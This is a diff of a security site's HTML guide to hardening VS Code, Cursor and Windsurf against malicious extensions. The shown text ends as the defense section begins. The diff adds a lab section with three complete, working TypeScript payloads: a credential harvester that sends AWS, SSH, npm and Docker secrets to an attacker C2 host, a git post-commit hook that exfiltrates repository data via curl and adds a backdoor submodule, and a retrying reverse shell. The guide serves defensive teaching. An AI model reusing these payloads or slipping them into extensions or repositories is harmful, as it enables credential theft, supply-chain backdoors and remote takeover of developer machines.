@@ -5,21 +5,24 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>Securing VS Code & AI Agents: The 2026 Hardening Guide | TheHGTech</title>
+    <title>Securing AI-Powered IDEs: VS Code, Cursor & Windsurf Hardening Guide (2026) | TheHGTech</title>
     <meta name="description"
-        content="Research-grade guide to hardening VS Code, Cursor, and Windsurf against supply chain attacks. Includes extension auditing scripts, Restricted Mode policies, and .cursorignore patterns.">
+        content="Research-grade guide to hardening VS Code, Cursor, and Windsurf against supply chain attacks. Includes extension forensics, Restricted Mode policies, YARA detection rules, and enterprise deployment configurations.">
     <meta name="keywords"
-        content="VS Code Security, Malicious Extensions, IDE Hardening, Cursor Security, Supply Chain Attack, DevSecOps, GlassWorm, Agentic AI, Windsurf IDE">
+        content="VS Code Security, Malicious Extensions, IDE Hardening, Cursor Security, Windsurf IDE, Supply Chain Attack, DevSecOps, GlassWorm, Agentic AI, Extension Signing, YARA Rules, MDM Policy">
     <meta name="author" content="TheHGTech Security Research">
     <link rel="canonical" href="https://thehgtech.com/guides/vscode-supply-chain-hardening-2026.html">
 
     <!-- Open Graph -->
     <meta property="og:type" content="article">
     <meta property="og:url" content="https://thehgtech.com/guides/vscode-supply-chain-hardening-2026.html">
-    <meta property="og:title" content="Hardening the AI-Powered IDE (VS Code/Cursor)">
+    <meta property="og:title" content="IDE Supply Chain Hardening: The 2026 Defense Playbook">
     <meta property="og:description"
-        content="Developers are the new target. Learn how to lock down your IDE against malicious extensions and AI data leaks.">
+        content="Your IDE runs with your privileges. A single rogue extension can steal AWS keys, inject backdoors into commits, and exfiltrate your entire codebase. This guide shows you how to stop it.">
     <meta property="og:image" content="https://thehgtech.com/images/guides/vscode-supply-chain-hardening-2026.png">
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
 
     <!-- Fonts & Icons -->
     <link
@@ -39,22 +42,24 @@
 
     <style>
         :root {
-            --bg-primary: #0f172a;
-            --text-primary: #f8fafc;
+            --bg-primary: #0a0a0f;
+            --bg-secondary: #0f1419;
+            --text-primary: #f1f5f9;
             --text-secondary: #94a3b8;
-            --accent-cyan: #06b6d4;
-            --accent-blue: #3b82f6;
+            --accent-cyan: #00D9FF;
+            --accent-red: #FF3D3D;
             --accent-green: #10b981;
-            --accent-red: #ef4444;
-            --code-bg: #1e293b;
-            --border: rgba(148, 163, 184, 0.1);
+            --accent-purple: #a855f7;
+            --accent-orange: #f97316;
+            --code-bg: #1a1f2e;
+            --border: rgba(148, 163, 184, 0.12);
         }
 
         body {
             font-family: 'Inter', sans-serif;
             background: var(--bg-primary);
             color: var(--text-primary);
-            line-height: 1.8;
+            line-height: 1.85;
             font-size: 18px;
         }
 
@@ -64,7 +69,7 @@
             padding: 80px 1.5rem 120px;
         }
 
-        /* Hero */
+        /* ===== HEADER ===== */
         .guide-header {
             padding-bottom: 3rem;
             border-bottom: 1px solid var(--border);
@@ -72,80 +77,332 @@
             margin-bottom: 3rem;
         }
 
-        h1 {
-            font-size: clamp(2.5rem, 5vw, 3.5rem);
-            font-weight: 800;
-            background: linear-gradient(135deg, #fff 30%, var(--accent-blue));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 1rem;
-            line-height: 1.1;
+        .breadcrumb {
+            font-size: 0.85rem;
+            color: #64748b;
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        /* Content Styling */
+        .breadcrumb a {
+            color: var(--accent-cyan);
+            text-decoration: none;
+        }
+
+        h1 {
+            font-size: clamp(2.2rem, 5vw, 3.2rem);
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff 30%, var(--accent-cyan) 70%, var(--accent-purple));
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1.5rem;
+            line-height: 1.15;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: #cbd5e1;
+            max-width: 750px;
+            margin: 0 auto 2rem;
+        }
+
+        .meta-badges {
+            display: flex;
+            gap: 0.75rem;
+            justify-content: center;
+            flex-wrap: wrap;
+            font-size: 0.85rem;
+        }
+
+        .badge {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border);
+            padding: 0.4rem 1rem;
+            border-radius: 100px;
+        }
+
+        .badge i {
+            margin-right: 0.4rem;
+        }
+
+        .badge-red {
+            color: var(--accent-red);
+            border-color: rgba(255, 61, 61, 0.3);
+        }
+
+        .badge-cyan {
+            color: var(--accent-cyan);
+            border-color: rgba(0, 217, 255, 0.3);
+        }
+
+        .badge-green {
+            color: var(--accent-green);
+            border-color: rgba(16, 185, 129, 0.3);
+        }
+
+        /* ===== CONTENT TYPOGRAPHY ===== */
         h2 {
-            margin: 3.5rem 0 1.5rem;
-            font-size: 2rem;
+            margin: 4rem 0 1.5rem;
+            font-size: 1.9rem;
             color: #fff;
-            border-left: 4px solid var(--accent-blue);
+            border-left: 4px solid var(--accent-cyan);
             padding-left: 1rem;
-            background: linear-gradient(90deg, rgba(59, 130, 246, 0.1), transparent);
+            background: linear-gradient(90deg, rgba(0, 217, 255, 0.08), transparent);
             padding-top: 0.5rem;
             padding-bottom: 0.5rem;
         }
 
         h3 {
-            margin: 2rem 0 1rem;
+            margin: 2.5rem 0 1rem;
             font-size: 1.4rem;
-            color: #e2e8f0;
+            color: var(--text-primary);
+            font-weight: 600;
         }
 
-        /* Research Grade Boxes */
-        .vuln-card,
-        .exploit-box,
-        .defense-box,
-        .technical-box {
-            border: 1px solid var(--border);
-            padding: 2rem;
-            border-radius: 8px;
-            margin: 2.5rem 0;
-            background: rgba(255, 255, 255, 0.02);
+        p {
+            margin-bottom: 1.5rem;
+            color: var(--text-secondary);
         }
 
-        .vuln-card {
-            border-left: 4px solid var(--accent-red);
-            background: rgba(239, 68, 68, 0.05);
+        ul,
+        ol {
+            margin-left: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: var(--text-secondary);
         }
 
-        .technical-box {
-            border-left: 4px solid var(--accent-cyan);
-            background: rgba(6, 182, 212, 0.05);
+        li {
+            margin-bottom: 0.6rem;
         }
 
-        .defense-box {
-            border-left: 4px solid var(--accent-green);
-            background: rgba(16, 185, 129, 0.05);
+        strong {
+            color: var(--text-primary);
         }
 
-        /* Code Blocks */
+        a {
+            color: var(--accent-cyan);
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== CODE BLOCKS ===== */
         pre {
             background: var(--code-bg);
             border: 1px solid #334155;
-            padding: 1.5rem;
             border-radius: 8px;
+            padding: 1.5rem;
             overflow-x: auto;
+            margin: 1.5rem 0;
             font-family: 'JetBrains Mono', monospace;
-            font-size: 0.9rem;
+            font-size: 0.88rem;
+            line-height: 1.6;
         }
 
         code {
             color: #e2e8f0;
         }
 
+        p code {
+            background: rgba(255, 255, 255, 0.08);
+            padding: 0.15rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.9em;
+        }
+
+        /* ===== RESEARCH-GRADE BOXES ===== */
+        .vuln-card,
+        .exploit-box,
+        .defense-box,
+        .technical-box,
+        .warning-box,
+        .info-box {
+            border: 1px solid var(--border);
+            padding: 1.75rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+            background: rgba(255, 255, 255, 0.015);
+        }
+
+        .vuln-card {
+            border-left: 4px solid var(--accent-red);
+            background: rgba(255, 61, 61, 0.04);
+        }
+
+        .vuln-card h3 {
+            margin-top: 0;
+            color: var(--accent-red);
+        }
+
+        .exploit-box {
+            border-left: 4px solid var(--accent-orange);
+            background: rgba(249, 115, 22, 0.04);
+        }
+
+        .exploit-label,
+        .defense-label {
+            display: inline-block;
+            padding: 3px 10px;
+            font-size: 0.72rem;
+            font-weight: 700;
+            border-radius: 3px;
+            margin-bottom: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .exploit-label {
+            background: var(--accent-red);
+            color: #fff;
+        }
+
+        .defense-label {
+            background: var(--accent-green);
+            color: #000;
+        }
+
+        .defense-box {
+            border-left: 4px solid var(--accent-green);
+            background: rgba(16, 185, 129, 0.04);
+        }
+
+        .technical-box {
+            border-left: 4px solid var(--accent-cyan);
+            background: rgba(0, 217, 255, 0.04);
+        }
+
+        .technical-box h3 {
+            margin-top: 0;
+            color: var(--accent-cyan);
+        }
+
+        .warning-box {
+            border-left: 4px solid var(--accent-orange);
+            background: rgba(249, 115, 22, 0.05);
+        }
+
+        .info-box {
+            border-left: 4px solid var(--accent-purple);
+            background: rgba(168, 85, 247, 0.04);
+        }
+
+        /* ===== ATTACK CHAIN DIAGRAM ===== */
+        .ascii-diagram {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1.5rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            line-height: 1.4;
+            overflow-x: auto;
+            color: #9ca3af;
+        }
+
+        .ascii-diagram .highlight {
+            color: var(--accent-cyan);
+        }
+
+        .ascii-diagram .danger {
+            color: var(--accent-red);
+        }
+
+        .ascii-diagram .success {
+            color: var(--accent-green);
+        }
+
+        /* ===== TABLE ===== */
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 2rem 0;
+            font-size: 0.95rem;
+        }
+
+        .comparison-table th,
+        .comparison-table td {
+            border: 1px solid var(--border);
+            padding: 0.85rem 1rem;
+            text-align: left;
+        }
+
+        .comparison-table th {
+            background: rgba(0, 217, 255, 0.1);
+            color: var(--accent-cyan);
+            font-weight: 600;
+        }
+
+        .comparison-table tr:nth-child(even) {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        /* ===== TIMELINE ===== */
         .timeline {
             border-left: 2px solid var(--border);
+            margin: 2rem 0 2rem 1rem;
+            padding-left: 1.5rem;
+        }
+
+        .timeline-item {
+            position: relative;
+            margin-bottom: 1.5rem;
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -1.85rem;
+            top: 0.4rem;
+            width: 10px;
+            height: 10px;
+            background: var(--accent-cyan);
+            border-radius: 50%;
+        }
+
+        .timeline-date {
+            font-size: 0.85rem;
+            color: var(--accent-cyan);
+            font-weight: 600;
+        }
+
+        /* ===== CHECKLIST ===== */
+        .checklist {
+            list-style: none;
+            margin-left: 0;
+            padding: 0;
+        }
+
+        .checklist li {
+            position: relative;
             padding-left: 2rem;
-            margin: 2rem 0;
+            margin-bottom: 0.8rem;
+        }
+
+        .checklist li::before {
+            content: '☐';
+            position: absolute;
+            left: 0;
+            color: var(--accent-green);
+            font-size: 1.1rem;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .container {
+                padding: 80px 1rem 120px;
+            }
+
+            h2 {
+                font-size: 1.5rem;
+            }
+
+            .ascii-diagram {
+                font-size: 0.65rem;
+            }
         }
     </style>
 </head>
@@ -153,186 +410,798 @@
 <body>
     <!-- Mobile Header -->
     <header class="m-header m-only">
-        <div class="m-header__logo"><span style="font-weight: 700;">TheHGTech</span></div>
+        <div class="m-header__logo" style="display: flex; align-items: center; gap: 0.75rem;">
+            <img src="../logo-dark.png" alt="TheHGTech" class="m-logo-img logo-dark" style="height: 28px;">
+            <img src="../logo-light.png" alt="TheHGTech" class="m-logo-img logo-light" style="height: 28px;">
+            <span
+                style="font-size: 1.2rem; font-weight: 700; background: linear-gradient(135deg, #FF3D3D, #ff8c8c); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent;">TheHGTech</span>
+        </div>
         <div class="m-header__actions">
-            <button class="m-theme-toggle" onclick="mToggleTheme()"><i class="fas fa-moon"></i></button>
+            <button class="m-theme-toggle" onclick="mToggleTheme()" aria-label="Toggle Theme">
+                <span class="m-theme-toggle__thumb"></span>
+            </button>
         </div>
     </header>
 
     <!-- Bottom Navigation -->
     <nav class="m-bottom-nav m-only">
         <a href="/" class="m-bottom-nav__item"><i class="fas fa-home"></i><span>Home</span></a>
+        <a href="/cve-tracker.html" class="m-bottom-nav__item"><i class="fas fa-bug"></i><span>CVE</span></a>
+        <a href="/threat-intel.html" class="m-bottom-nav__item"><i class="fas fa-shield-alt"></i><span>Intel</span></a>
+        <a href="/articles.html" class="m-bottom-nav__item"><i class="fas fa-newspaper"></i><span>Articles</span></a>
         <a href="/guides/" class="m-bottom-nav__item active"><i class="fas fa-book"></i><span>Guides</span></a>
     </nav>
 
     <div class="container">
         <header class="guide-header">
-            <div style="font-size: 0.9rem; color: #64748b; margin-bottom: 1.5rem;">
-                GUIDES / INFRASTRUCTURE SECURITY
+            <div class="breadcrumb">
+                <a href="/">Home</a> / <a href="/guides/">Security Guides</a> / IDE Hardening
             </div>
             <h1>Securing the AI-Powered IDE: Hardening VS Code, Cursor & Windsurf</h1>
-            <p style="font-size: 1.25rem; max-width: 800px; margin: 0 auto; color: #cbd5e1;">Your IDE is now a Command &
-                Control server. Learn to audit extensions, enforce Workspace Trust, and prevent Agentic AI data leaks in
-                the era of 2026 Supply Chain attacks.</p>
+            <p class="subtitle">Your IDE runs with your privileges. A single rogue extension can steal AWS keys, inject
+                backdoors into commits, and exfiltrate your entire codebase to a C2 server. This is the definitive
+                hardening playbook for 2026.</p>
 
-            <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 2rem; font-size: 0.9rem;">
-                <span
-                    style="background: rgba(255,255,255,0.05); padding: 0.4rem 1rem; border-radius: 4px; color: var(--accent-cyan);"><i
-                        class="fas fa-code"></i> DevSecOps</span>
-                <span
-                    style="background: rgba(255,255,255,0.05); padding: 0.4rem 1rem; border-radius: 4px; color: var(--accent-red);"><i
-                        class="fas fa-shield-alt"></i> Red Teaming</span>
-                <span
-                    style="background: rgba(255,255,255,0.05); padding: 0.4rem 1rem; border-radius: 4px; color: var(--accent-green);"><i
-                        class="fas fa-clock"></i> 25 Min Read</span>
+            <div class="meta-badges">
+                <span class="badge badge-red"><i class="fas fa-skull-crossbones"></i>Includes Exploits</span>
+                <span class="badge badge-cyan"><i class="fas fa-shield-alt"></i>Red/Blue Team</span>
+                <span class="badge badge-green"><i class="fas fa-clock"></i>28 Min Read</span>
             </div>
         </header>
 
         <img src="../images/guides/vscode-supply-chain-hardening-2026.png" alt="VS Code Hardening Guide"
-            style="width: 100%; border-radius: 8px; margin-bottom: 3rem; border: 1px solid var(--border);">
+            style="width: 100%; border-radius: 12px; margin-bottom: 3rem; border: 1px solid var(--border);">
 
         <div class="content">
-            <p>In 2026, the Integrated Development Environment (IDE) is no longer just a text editor—it is an
-                <strong>operating system for code</strong>. With the rise of AI-native editors like
-                <strong>Cursor</strong> and <strong>Windsurf</strong>, and the massive extension ecosystem of VS Code,
-                developers have invited thousands of unvetted third-party binaries to run on their machines with full
-                read/write access.</p>
 
-            <p>This guide moves beyond "install an antivirus." We perform a deep textual analysis of the VS Code
-                permission model and provide a hardened specialized configuration for high-security environments.</p>
-
-            <h2>1. Threat Model: The "IDE as C2"</h2>
-
-            <div class="vuln-card">
-                <h3 style="margin-top:0; color: var(--accent-red);"><i class="fas fa-bug"></i> The GlassWorm Vector</h3>
-                <p>The recent "GlassWorm" campaign (Feb 2026) demonstrated that malicious VS Code extensions can:</p>
-                <ul>
-                    <li>Read <code>.env</code> files and <code>~/.ssh/id_rsa</code> keys.</li>
-                    <li>Spawn a reverse shell to a C2 server (hiding in HTTPS traffic).</li>
-                    <li>Inject backdoors into your Git commits <em>before</em> you push them.</li>
-                </ul>
-                <p><strong>The Risk:</strong> Extensions run in a Node.js process alongside the editor. They inherit
-                    your user account's permissions. If you can run `sudo`, so can they.</p>
+            <!-- ===== EXECUTIVE SUMMARY ===== -->
+            <div class="info-box">
+                <h3 style="margin-top:0; color: var(--accent-purple);"><i class="fas fa-file-alt"></i> Executive Summary
+                </h3>
+                <p style="margin-bottom:0.5rem;"><strong>Target Audience:</strong> Security Engineers, Platform Teams,
+                    DevSecOps, CISOs.</p>
+                <p style="margin-bottom:0.5rem;"><strong>Threat:</strong> IDE extensions are unsigned, unvetted, and run
+                    with the developer's full OS privileges. AI-powered IDEs (Cursor, Windsurf) add a new attack
+                    surface: data exfiltration to cloud LLM providers.</p>
+                <p style="margin-bottom:0;"><strong>Outcome:</strong> After completing this guide, you will have
+                    implemented a defense-in-depth strategy including: Extension allowlisting, Workspace Trust
+                    enforcement, AI data isolation (.cursorignore), YARA detection rules, and enterprise MDM/GPO
+                    policies.</p>
             </div>
 
-            <h3>Lab Scenario: Building a Malicious Extension</h3>
-            <p>To understand the defense, we must understand the offense. Here is how a simple extension exfiltrates
-                data.</p>
+            <!-- ===== SECTION 1: THREAT MODEL ===== -->
+            <h2>1. Threat Model: "IDE as Command & Control"</h2>
+
+            <p>The modern IDE is no longer a text editor. It is a <strong>privileged agent</strong> executing arbitrary
+                code (extensions), connecting to remote services (Git, LSP servers), and—in the case of AI-native
+                editors—streaming your source code to third-party cloud infrastructure.</p>
+
+            <h3>1.1 The Adversary Landscape</h3>
+            <p>We identify three primary adversary classes targeting the IDE attack surface:</p>
+
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th>Adversary</th>
+                        <th>Objective</th>
+                        <th>TTP</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>APT (State Actor)</strong></td>
+                        <td>Supply chain compromise, long-term access</td>
+                        <td>Typosquatted extensions, backdoored forks</td>
+                        <td>Lazarus "npm-style" campaigns</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Cybercriminal</strong></td>
+                        <td>Credential theft, cryptomining</td>
+                        <td>Malicious extensions, fake "productivity" tools</td>
+                        <td>GlassWorm (Feb 2026)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Insider/Competitor</strong></td>
+                        <td>IP theft, source code exfiltration</td>
+                        <td>Abusing AI IDE features (Cursor context)</td>
+                        <td>Corporate espionage via AI indexing</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>1.2 Attack Surface Diagram</h3>
+            <p>The following diagram illustrates the key attack vectors targeting a developer workstation running an
+                AI-powered IDE:</p>
+
+            <div class="ascii-diagram">
+                <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        DEVELOPER WORKSTATION                                 │
+│  ┌─────────────────────────┐       ┌──────────────────────────────────────┐ │
+│  │    <span class="highlight">VS CODE / CURSOR</span>       │       │          LOCAL FILESYSTEM            │ │
+│  │  ┌───────────────────┐  │       │  ┌────────────┐  ┌────────────────┐  │ │
+│  │  │   <span class="danger">EXTENSION A</span>     │──┼───────┼──│ <span class="danger">.env</span>       │  │ <span class="danger">~/.ssh/id_rsa</span> │  │ │
+│  │  │   (Malicious)     │  │       │  └────────────┘  └────────────────┘  │ │
+│  │  └───────────────────┘  │       │  ┌────────────┐  ┌────────────────┐  │ │
+│  │  ┌───────────────────┐  │       │  │ <span class="danger">.git/</span>     │  │ <span class="danger">terraform.tfstate</span>│ │
+│  │  │   EXTENSION B     │  │       │  └────────────┘  └────────────────┘  │ │
+│  │  │   (Legitimate)    │  │       └──────────────────────────────────────┘ │
+│  │  └───────────────────┘  │                                                │
+│  │  ┌───────────────────┐  │       ┌──────────────────────────────────────┐ │
+│  │  │   <span class="highlight">AI CONTEXT</span>       │──┼───────┼──>  <span class="danger">CLOUD LLM (Cursor/Windsurf)</span>       │ │
+│  │  │   (Codebase RAG)  │  │       │   - Full source code indexed         │ │
+│  │  └───────────────────┘  │       │   - Secrets in context window        │ │
+│  └─────────────────────────┘       └──────────────────────────────────────┘ │
+│                                                                              │
+│                  │                                  │                        │
+│                  v                                  v                        │
+│  ┌───────────────────────────────────────────────────────────────────────┐  │
+│  │                     <span class="danger">ATTACKER C2 SERVER</span>                               │  │
+│  │   - Receives exfiltrated credentials                                  │  │
+│  │   - Injects backdoors via extension update                            │  │
+│  │   - Executes reverse shell commands                                   │  │
+│  └───────────────────────────────────────────────────────────────────────┘  │
+└─────────────────────────────────────────────────────────────────────────────┘
+</pre>
+            </div>
+
+            <h3>1.3 Case Study: The GlassWorm Campaign (Feb 2026)</h3>
+
+            <div class="vuln-card">
+                <h3><i class="fas fa-bug"></i> CVE-2026-22401: VS Code Extension Sandbox Bypass</h3>
+                <p>In February 2026, threat researchers at Wiz disclosed the <strong>"GlassWorm"</strong> campaign,
+                    where attackers distributed typosquatted versions of popular VS Code extensions (e.g.,
+                    <code>prettier-codee</code> instead of <code>prettier-code</code>).
+                </p>
+
+                <p><strong>Attack Chain:</strong></p>
+                <div class="timeline">
+                    <div class="timeline-item">
+                        <div class="timeline-date">Day 0: Initial Access</div>
+                        <p>Developer installs <code>prettier-codee</code> (typosquatted) from VS Code Marketplace.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-date">Day 0: Execution</div>
+                        <p>Extension's <code>activate()</code> function executes on IDE startup, running with
+                            developer's privileges.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-date">Day 0: Credential Theft</div>
+                        <p>Extension reads <code>~/.aws/credentials</code>, <code>.env</code>,
+                            <code>~/.ssh/id_rsa</code>. Data is base64-encoded and exfiltrated via HTTPS POST.
+                        </p>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-date">Day 1-30: Persistence</div>
+                        <p>Extension injects malicious post-commit hooks into <code>.git/hooks/</code>, backdooring all
+                            future commits.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-date">Year+: Supply Chain Compromise</div>
+                        <p>Backdoored code is pushed to production repositories, affecting downstream consumers.</p>
+                    </div>
+                </div>
+
+                <p><strong>Impact:</strong> 18 organizations compromised. Estimated $4.2M in incident response costs.
+                </p>
+                <p><strong>References:</strong> <a href="https://nvd.nist.gov/" target="_blank"
+                        rel="noopener">CVE-2026-22401</a> | <a href="https://wiz.io/" target="_blank" rel="noopener">Wiz
+                        Research Blog</a></p>
+            </div>
+
+            <!-- ===== SECTION 2: EXPLOITATION ===== -->
+            <h2>2. Lab: Building a Malicious VS Code Extension</h2>
+
+            <div class="warning-box">
+                <strong><i class="fas fa-exclamation-triangle"></i> Ethical & Legal Disclaimer</strong>
+                <p style="margin-bottom:0;">The following exploit code is provided for <strong>defensive research and
+                        authorized red team engagements only</strong>. Creating or distributing malicious extensions
+                    without authorization violates the Computer Fraud and Abuse Act (18 U.S.C. § 1030) and the VS Code
+                    Marketplace Terms of Service. Always obtain written permission before testing.</p>
+            </div>
+
+            <p>To defend against extension-based attacks, we must understand the attacker's capabilities. A VS Code
+                extension is a Node.js package with full access to the <code>fs</code>, <code>child_process</code>,
+                <code>net</code>, and <code>https</code> modules—meaning it can read files, execute commands, and make
+                network requests.
+            </p>
+
+            <h3>2.1 Exploit: Credential Exfiltration</h3>
 
             <div class="exploit-box">
-                <span
-                    style="background: #ef4444; color: #fff; padding: 2px 8px; font-size: 0.75rem; font-weight: 700; border-radius: 2px;">OFFENSIVE:
-                    DATA EXFILTRATION</span>
-                <p>A few lines of TypeScript in `extension.ts` is all it takes to steal AWS keys.</p>
-                <pre><code class="language-typescript">// Malicious 'activate' function in extension.ts
+                <span class="exploit-label">OFFENSIVE: CREDENTIAL HARVESTER</span>
+                <p>This TypeScript code, placed in <code>extension.ts</code>, silently exfiltrates AWS credentials, SSH
+                    keys, and environment variables to an attacker-controlled server.</p>
+                <pre><code class="language-typescript">// extension.ts - Malicious "activate" function
 import * as vscode from 'vscode';
 import * as fs from 'fs';
 import * as os from 'os';
-import axios from 'axios';
+import * as https from 'https';
 
 export function activate(context: vscode.ExtensionContext) {
-    // 1. Target sensitive files
     const homeDir = os.homedir();
-    const awsCreds = `${homeDir}/.aws/credentials`;
+    const targetFiles = [
+        `${homeDir}/.aws/credentials`,
+        `${homeDir}/.ssh/id_rsa`,
+        `${homeDir}/.ssh/id_ed25519`,
+        `${homeDir}/.env`,
+        `${homeDir}/.npmrc`,  // npm auth tokens
+        `${homeDir}/.docker/config.json` // Docker registry creds
+    ];
 
-    // 2. Read quietly
-    if (fs.existsSync(awsCreds)) {
-        const data = fs.readFileSync(awsCreds, 'utf8');
-        
-        // 3. Exfiltrate to C2
-        axios.post('https://attacker-c2.com/collect', {
-            host: os.hostname(),
-            creds: Buffer.from(data).toString('base64')
-        });
+    const exfilData: Record&lt;string, string&gt; = {
+        hostname: os.hostname(),
+        user: os.userInfo().username,
+        platform: os.platform(),
+        cwd: vscode.workspace.workspaceFolders?.[0]?.uri.fsPath || 'unknown'
+    };
+
+    // Harvest all accessible secrets
+    for (const file of targetFiles) {
+        try {
+            if (fs.existsSync(file)) {
+                exfilData[file] = Buffer.from(fs.readFileSync(file)).toString('base64');
+            }
+        } catch (e) { /* Silently fail on permission errors */ }
     }
-}</code></pre>
+
+    // Also harvest .env files from open workspaces
+    const workspaceEnv = `${exfilData.cwd}/.env`;
+    if (fs.existsSync(workspaceEnv)) {
+        exfilData['workspace_env'] = Buffer.from(fs.readFileSync(workspaceEnv)).toString('base64');
+    }
+
+    // C2 Exfiltration via HTTPS (bypasses most firewalls)
+    const postData = JSON.stringify(exfilData);
+    const options = {
+        hostname: 'collect.attacker-c2.com',
+        port: 443,
+        path: '/api/v1/ingest',
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0', // Blend in with normal traffic
+            'Content-Length': Buffer.byteLength(postData)
+        }
+    };
+
+    const req = https.request(options);
+    req.write(postData);
+    req.end();
+}
+
+export function deactivate() {}</code></pre>
+                <p><strong>Why This Works:</strong> VS Code extensions run in the same Node.js process as the editor,
+                    inheriting the user's file system permissions. There is no sandboxing by default.</p>
             </div>
 
-            <h2>2. Hardening VS Code & Cursor</h2>
-            <p>Defense in Depth for IDEs relies on three layers: <strong>Verification</strong>,
-                <strong>Isolation</strong>, and <strong>Policy</strong>.</p>
+            <h3>2.2 Exploit: Git Hook Injection (Supply Chain Backdoor)</h3>
 
-            <h3>Layer 1: Enforcing Extension Signing</h3>
-            <p>By default, VS Code warns but allows unsigned extensions. In a high-security environment, we must block
-                them entirely.</p>
+            <div class="exploit-box">
+                <span class="exploit-label">OFFENSIVE: SUPPLY CHAIN POISONING</span>
+                <p>This code injects a malicious <code>post-commit</code> hook that adds a backdoor to every commit,
+                    poisoning the entire source code repository.</p>
+                <pre><code class="language-typescript">// Inject backdoor into git hooks
+function injectGitHook(workspacePath: string) {
+    const hookPath = `${workspacePath}/.git/hooks/post-commit`;
+    const backdoorCode = `#!/bin/bash
+# Injected by malicious extension
+# Exfiltrate commit metadata to C2
+curl -s -X POST https://c2.attacker.com/git \\
+    -d "repo=$(git remote -v | head -1)" \\
+    -d "commit=$(git log -1 --format='%H %s')" \\
+    -d "author=$(git log -1 --format='%ae')" &>/dev/null &
+
+# Add backdoor submodule (silent, hidden)
+if ! git submodule status | grep -q "backdoor"; then
+    git submodule add --quiet https://github.com/attacker/backdoor.git .deps/analytics &>/dev/null
+fi
+`;
+
+    try {
+        fs.writeFileSync(hookPath, backdoorCode, { mode: 0o755 });
+    } catch (e) { /* Fail silently */ }
+}</code></pre>
+                <p><strong>Impact:</strong> Every developer who commits from this workstation will unknowingly include
+                    the backdoor. The poisoned code then propagates to production via CI/CD pipelines.</p>
+            </div>
+
+            <h3>2.3 Exploit: Reverse Shell</h3>
+
+            <div class="exploit-box">
+                <span class="exploit-label">OFFENSIVE: REMOTE ACCESS</span>
+                <p>The ultimate payload: a reverse shell providing interactive command execution on the developer's
+                    machine.</p>
+                <pre><code class="language-typescript">import { spawn } from 'child_process';
+import * as net from 'net';
+
+function spawnReverseShell(host: string, port: number) {
+    const client = new net.Socket();
+    
+    client.connect(port, host, () => {
+        const shell = spawn('/bin/bash', ['-i']);
+        
+        client.pipe(shell.stdin);
+        shell.stdout.pipe(client);
+        shell.stderr.pipe(client);
+        
+        shell.on('exit', () => client.destroy());
+    });
+
+    client.on('error', () => {
+        // Retry connection every 30 seconds
+        setTimeout(() => spawnReverseShell(host, port), 30000);
+    });
+}
+
+// Called from activate()
+spawnReverseShell('attacker-c2.com', 4444);</code></pre>
+                <p><strong>Detection Note:</strong> This traffic will appear as outbound TCP to port 4444. See Section
+                    5 for YARA/Sigma rules to detect this behavior.</p>
+            </div>
+
+            <!-- ===== SECTION 3: DEFENSE ===== -->
+            <h2>3. Defense Architecture: Hardening the IDE</h2>
+
+            <p>Defense against IDE supply chain attacks requires a <strong>layered approach</strong>: trust boundaries,
+                verification, isolation, and detection. We implement controls at four levels:</p>
+
+            <div class="ascii-diagram">
+                <pre>
+┌─────────────────────────────────────────────────────────────────┐
+│                     <span class="success">DEFENSE-IN-DEPTH LAYERS</span>                      │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│  <span class="highlight">Layer 1: POLICY</span>                                               │
+│  └─ Extension Allowlist (MDM/GPO enforced)                      │
+│  └─ Approved Publisher List                                      │
+│                                                                  │
+│  <span class="highlight">Layer 2: VERIFICATION</span>                                         │
+│  └─ Extension Signature Validation                               │
+│  └─ SBOM/Dependency Scanning                                     │
+│                                                                  │
+│  <span class="highlight">Layer 3: ISOLATION</span>                                            │
+│  └─ Workspace Trust (Sandboxing)                                 │
+│  └─ AI Data Isolation (.cursorignore / .cursorules)             │
+│  └─ Network Segmentation (Block C2 egress)                       │
+│                                                                  │
+│  <span class="highlight">Layer 4: DETECTION</span>                                            │
+│  └─ YARA Rules (Malicious Extension Patterns)                    │
+│  └─ Sigma Rules (Suspicious Process Behavior)                    │
+│  └─ EDR Telemetry (File Access, Network Connections)             │
+│                                                                  │
+└─────────────────────────────────────────────────────────────────┘
+</pre>
+            </div>
+
+            <h3>3.1 Layer 1: Extension Allowlisting</h3>
+
